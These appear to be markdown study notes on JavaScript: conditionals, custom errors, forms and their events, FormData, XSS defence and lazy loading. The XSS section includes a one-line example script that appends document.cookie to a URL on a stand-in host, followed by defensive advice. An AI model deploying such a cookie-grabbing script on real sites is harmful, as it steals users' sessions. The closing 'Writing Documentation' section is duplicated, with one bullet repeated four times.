They act as decision points that can branch the path of code to be executed based on the result of a condition.

- `if () {}`
  - the code inside the curly braces will be executed if the condition is true.

- `else {}`
  - the code inside the curly braces will be executed if the condition is false.

- `else if () {}`
  - the code inside the curly braces will be executed if the previous conditions are false and the current condition is true. instead of having multiple nested `if` statements.

- `switch () {}`
  - the code inside the curly braces will be executed if the current value matches the value of the switch.
  - It uses strict comparison (`===`) to match the value with the cases. meaning that `switch` will not do type coercion.

```js
// Examples

let time = 9;

if (time < 10) {
  greeting = 'Good morning';
} else if (time < 20) {
  greeting = 'Good day';
} else {
  greeting = 'Good evening';
}
console.log(greeting); // Good morning

let day = 'Monday';

switch (day) {
  case 'Monday':
    console.log('Start of the week');
    break;
  case 'Friday':
    console.log('End of the week');
    break;
  default:
    console.log('Midweek');
}
```

---

## Errors

When an exception is thrown, the interpreter stops and checks the current execution context for exception-handling code. So if the error occurs in a function, the interpreter starts to look for error-handling code in that function.

If an error happens in a function and the function does not have an exception handler, the interpreter goes to the line of code that called the function.

### Error object

When an error occurs, JavaScript generates an object containing the details about it. The object is then passed as an argument to the error-handling-code like `catch`

Error objects can help you find where your mistakes are and browsers have tools to help you read them.

![error-object](./img/error-object.png)
![error-object](./img/error-object2.png)
![error-object](./img/error-object3.png)
![error-object](./img/error-object4.png)
![error-object](./img/error-object5.png)

#### Custom Errors

When we develop something, we often need our own error classes to reflect specific things that may go wrong in our tasks. For errors in network operations we may need `HttpError`, for database operations `DbError`, for searching operations `NotFoundError` and so on.

- Our errors should support basic error properties like message, name and, preferably, stack. But they also may have other properties of their own, e.g. `HttpError` objects may have a `statusCode` property with a value like `404` or `403` or `500`.
- also, As the application grows, our own errors naturally form a hierarchy. For instance, HttpTimeoutError may inherit from HttpError, and so on.

##### Extending Error

We can inherit from Error and other built-in error classes normally. We just need to take care of the `name` property and don’t forget to call `super`.

- We can use `instanceof` to check for particular errors. It also works with inheritance. But sometimes we have an error object coming from a 3rd-party library and there’s no easy way to get its class. Then name property can be used for such checks.

```js
class ValidationError extends Error {
  constructor(message) {
    super(message);
    this.name = 'ValidationError';
  }
}

// Usage
function readUser(json) {
  let user = JSON.parse(json);

  if (!user.age) {
    throw new ValidationError('No field: age');
  }
  if (!user.name) {
    throw new ValidationError('No field: name');
  }

  return user;
}

// Working example with try..catch
try {
  let user = readUser('{ "age": 25 }');
} catch (err) {
  if (err instanceof ValidationError) {
    alert('Invalid data: ' + err.message); // Invalid data: No field: name
  } else if (err instanceof SyntaxError) {
    // (*)
    alert('JSON Syntax Error: ' + err.message);
  } else {
    throw err; // unknown error, rethrow it (**)
  }
}
```

---

### Error Handling

More details in the [ASYNC.md](./4-ASYNC.md) file

---

## Forms

- You can access forms in the document using the `form` property

  ```js
  document.forms.myForm; // the form with name="myForm"
  document.forms[0]; // the first form in the document
  ```

- For any element, the form is available as `element.form`. So a form references all elements, and elements reference the form.
  ![form](./img/form1.png)

### Form Elements

#### input and textarea

- We can access their value as `input.value` (string) or `input.checked` (boolean) for checkboxes and radio buttons.
- Use `textarea.value`, not `textarea.innerHTML`
  - Please note that even though `<textarea>...</textarea>` holds its value as nested HTML, **we should never use `textarea.innerHTML` to access it**.
  - It stores only the HTML that was initially on the page, not the current value.

#### select and option

- `<select>` element has 3 important properties:

  1.`select.options` – the collection of `<option>` sub-elements, 2.`select.value` – the value of the currently selected `<option>` 3.`select.selectedIndex` – the number of the currently selected `<option>`

```html
<select id="select">
  <option value="apple">Apple</option>
  <option value="pear">Pear</option>
  <option value="banana">Banana</option>
</select>

<script>
  select.options[2].selected = true;
  select.selectedIndex = 2;
  select.value = 'banana';
  // get all selected values from multi-select (note that options is a HTMLCollection not an array)
  let selected = Array.from(select.options)
    .filter(option => option.selected)
    .map(option => option.value);
</script>
```

- creating **new option** element:
  - We can use `document.createElement('option')` and set attributes manually
  - or we can use the `Option` constructor:

    ```js
    option = new Option(text, value, defaultSelected, selected);

    // creates <option value="value">Text</option>
    let option = new Option('Text', 'value');

    // same but selected
    let option = new Option('Text', 'value', true, true);
    ```

- Dealing with numbers in `<input>`
  - The value of an `<input>` is always a **string**. If we need to get a number, we can use `parseInt` or `parseFloat`:

    ```js
    function onChange() {
      let parsedValue = parseInt(input.value);
      // or let parsedValue = +input.value;

      // check if it's a number using isNaN()
      if (!isNaN(parsedValue)) {
        console.log(parsedValue);
      } else {
        console.log('Not a number');
      }
    }
    ```

  - Questions for further understanding:
    - Why is this better than using `typeof`?
      - `typeof` checks the type of the variable, but it doesn't validate the content. For example, `typeof input.value === "number"` would be false for a numeric string like `"123"`, while `parseInt` can extract the number from it.

    - Why is using `parseInt` is better than using `Number()`?
      - `parseInt` can handle strings with non-numeric characters more gracefully, returning the integer value it can parse, while `Number()` will return `NaN` if the entire string is not a valid number.

        ```js
        parseInt('123abc'); // 123
        parseInt('abc123'); // NaN

        Number('123abc'); // NaN
        Number('abc123'); // NaN
        ```

---

### event handler in forms

- **form input**:
  - The `input` event triggers when any of the form fields are changed, usually it's used to validate the form in real-time.
  - It's a modern replacement for `change` event, as it triggers immediately after the value changes, not when the field is blurred.

  ```html
  <form id="form">
    <input type="text" name="login" id="inputLogin" />
    <input type="password" name="password" id="inputPassword" />
  </form>

  <script>
    const formEl = document.getElementById('form');
    formEl.addEventListener('input', function (e) {
      const { name, value } = e.target;
      // saving to sessionStorage
      const formData = JSON.parse(sessionStorage.getItem('formData')) || {};
      formData[name] = value;
      sessionStorage.setItem('formData', JSON.stringify(formData));
    });
  </script>
  ```

- **form submission**:
  - The `submit` event triggers when the form is submitted, it is usually used to validate the form before sending it to the server or to abort the submission and process it in JavaScript.

  - There are two main ways to submit a form:
    1. click on `<input type="submit">` or `<input type="image">`
    2. press **Enter** on an input field.

  > **Default behavior for form-submission:**
  >
  > - it creates a params string for the inputs in the form-body, then make a network request to the current address in the URL with these params
  >   ![form submission](./img/form-submission.png)
  - always use `e.preventDefault();` on form buttons as it defaults to refresh the page
  - try not to give a name attribute with value `"submit"` to a button as it might conflict and override with a `form.submit()` method
  - to remove focus from input field : `inputLogin.blur();`
  - **Note:** always use `e.preventDefault();` on hyperlinks `<a>` which has a `href="#"` and you want it to do something like ( show pop-up window ) as it defaults to go to top

---

### Form Validation

Modern HTML allows us to do many validations using input attributes: required, pattern and so on. And sometimes they are just what we need. JavaScript can be used when we want more flexibility. Also we could automatically send the changed value to the server if it’s correct.

#### Focusing: focus/blur

> - Focusing on an element generally means: “prepare to accept the data here”, so that’s the moment when we can run the code to initialize the required functionality.
> - The moment of losing the focus (“blur”) can be even more important. That’s when a user clicks somewhere else or presses Tab to go to the next form field, or there are other means as well.
>   - Losing the focus generally means: “the data has been entered”, so we can run the code to check it or even to save it to the server and so on.

- The `focus` event is called on focusing, and `blur` – when the element loses the focus.

  ```html
  <style>
    .invalid {
      border-color: red;
    }
    #error {
      color: red;
    }
  </style>

  Your email please:
  <input type="email" id="input" />

  <div id="error"></div>

  <script>
    input.onblur = function () {
      if (!input.value.includes('@')) {
        // not email
        input.classList.add('invalid');
        error.innerHTML = 'Please enter a correct email.';
      }
    };

    input.onfocus = function () {
      if (this.classList.contains('invalid')) {
        // remove the "error" indication, because the user wants to re-enter something
        this.classList.remove('invalid');
        error.innerHTML = '';
      }
    };
  </script>
  ```

- Methods `elem.focus()` and `elem.blur()` set/unset the focus on the element.
- **Allow focusing on any element: `tabindex`**
  - By default, many elements do not support focusing. The list varies a bit between browsers, but one thing is always correct: focus/blur support is guaranteed for elements that a visitor can interact with: `<button>,` `<input>,` `<select>,` `<a>` and so on.
  - On the other hand, elements that exist to format something, such as `<div>,` `<span>,` `<table>` – are unfocusable by default. The method `elem.focus()` doesn’t work on them, and focus/blur events are never triggered.
  - This can be changed using HTML-attribute **`tabindex`**.
  - Usually it’s used to make an element focusable, but keep the default switching order. To make an element a part of the form on par with `<input>`.
    - `tabindex="-1"` allows only programmatic focusing on an element. The Tab key ignores such elements, but method `elem.focus()` works.
  - The current focused element is available as `document.activeElement`
  - more on this here [Accessibility](../HTML-CSS/03-HTML.md#accessibility)

---

#### Events: change, input, cut, copy, paste

- Event: `change`
  - The change event triggers when the element has finished changing.
  - For text inputs that means that the event occurs when it loses focus.

- Event: `input`
  - The input event triggers **every time** after a value is modified by the user.
- Events: `cut`, `copy`, `paste`
  - They belong to `ClipboardEvent` class and provide access to the data that is cut/copied/pasted.
  - We also can use `event.preventDefault()` to **abort the action**, then nothing gets copied/pasted.

  ```html
  <input type="text" id="input" />
  <script>
    input.onpaste = function (event) {
      alert('paste: ' + event.clipboardData.getData('text/plain'));
      event.preventDefault();
    };

    input.oncut = input.oncopy = function (event) {
      alert(event.type + '-' + document.getSelection());
      event.preventDefault();
    };
  </script>
  ```

---

- Provide meaningful error messages
  - error messages are not identical in every browser. How can you show the same message to everyone?
    - To achieve this, use the `setCustomValidity()`

  ```js
  const nameInput = document.querySelector('[name="name"]');

  nameInput.addEventListener('invalid', () => {
    nameInput.setCustomValidity('Please enter your name.');
  });
  ```

### FormData API

The `FormData()` constructor creates a new `FormData` object. => [reference](https://javascript.info/formdata)

- The `FormData` interface provides a way to easily construct a set of `key/value pairs` representing form fields and their values, which can then be easily sent using the `fetch()` or `XMLHttpRequest.send()` method.
- It uses the same format a form would use if the encoding type were set to `"multipart/form-data"`.
- It's a great solution when we have bunch of inputs
  - inputs must have `name` attribute

```js
// it returns arrays of arrays
const dataArr = [...new FormData(formElement)];
// result : [[key1,value1],[key2,value2],[key3,value3],[key4,value4],...]

// get form-field
const email = formData.get('email');
// get form-entries
const formEntries = [...formData.entries()];

// now we want to convert it to an object
const data = Object.fromEntries(dataArr); // convert arrays into key-value-pairs Object
// result :
// {
//   key1 : value1,
//   key2 : value2,
//   key3 : value3,
//   key4 : value4,
// }
```

- the `FormData` object will be populated with the form's current keys/values using the name property of each element for the keys and their submitted value for the values. It will also encode file input content.

---

## CROSS-SITE SCRIPTING (XSS) ATTACKS

**XSS** involves an attacker placing malicious code into a site. Websites often feature content created by many different people.

**XSS** can give the attacker access to information in:

- The DOM (including form data)
- That website's cookies
- Session tokens: information that identifies you from other users when you log into a site
- Example:

  ```html
  <script>
    var adr = 'http : //example.com/xss .php?cookie=' + escape(document.cookie);
  </script>
  ```

### Defending against CROSS-SITE SCRIPTING

- **VALIDATE INPUT GOING TO THE SERVER**
  - Only let visitors input the kind of characters they need to when supplying information. This is known as **validation**. Do not allow untrusted users to submit HTML markup or JavaScript.
  - Double-check validation on the server before displaying user content/storing it in a database. This is important because **users could bypass validation in the browser by turning JavaScript off**.
  - The database may safely contain markup and script from trusted sources (e.g., your content management system). This is because it does not try to process the code; it just stores it.
- **ESCAPE DATA COMING FROM THE SERVER & DATABASE**
  - As your data leaves the database, all potentially dangerous characters should be escaped
  - Make sure that you are only inserting content generated by users into certain parts of the template files
  - Do not create DOM fragments containing HTML from untrusted sources. It should only be added as text once it has been escaped.

> you can safely use **innerHTML** to add markup to a page if you have written the code - but content from any untrusted sources should be escaped and added as text (not markup), using properties like **textContent**.

---

## Implementations

### Lazy loading

- is a strategy to identify resources as non-blocking (non-critical) and load these only when needed. It's a way to shorten the length of the critical rendering path, which translates into reduced page load times.
- `Steps`
  - HTML :

    ```html
    <!-- img 1 (low quality) is loaded first using the src attribute -->
    <!-- img 2 (high quality) is loaded only when the user scrolls to the img position using the data-src attribute -->
    <img
      src="img/digital-lazy.jpg"
      data-src="img/digital.jpg"
      alt="Computer"
      class="features__img lazy-img" />
    ```

  - CSS

    ```css
    .lazy-img {
      filter: blur(20px);
    }
    ```

  - JS -> [Example of loading images when the user scrolls to the img position](./3-DOM.md#examples-of-using-the-intersection-observer-api)

---

### Slider (pagination)

- `pagination` comes from `multiple pages`
- see `slider` section in => [BANKIST-Home_Page-js](https://github.com/abdrahmansoltan/Practicing-Javascript/blob/34fdec9c799cb49e84c4aedeffed3ca9a4b6cbe7/3_BANKIST/Home_Page/script.js#L195)

---

## Writing Documentation

[jsdoc](https://jsdoc.app/)

- before any function(the line above it) write `/**` and vsCode will configure it

## Writing Documentation

[jsdoc](https://jsdoc.app/)

- before any function(the line above it) write `/**` and vsCode will configure it
- before any function(the line above it) write `/**` and vsCode will configure it
- before any function(the line above it) write `/**` and vsCode will configure it
- before any function(the line above it) write `/**` and vsCode will configure it
